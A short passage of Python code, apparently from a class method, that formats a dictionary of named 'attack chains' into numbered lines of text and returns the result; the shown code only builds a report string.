        for chain_name, steps in self.attack_chains.items():
            lines.append(f"\n  {chain_name}:")
            for i, step in enumerate(steps, 1):
                lines.append(f"    {i}. {step}")

        return "\n".join(lines)
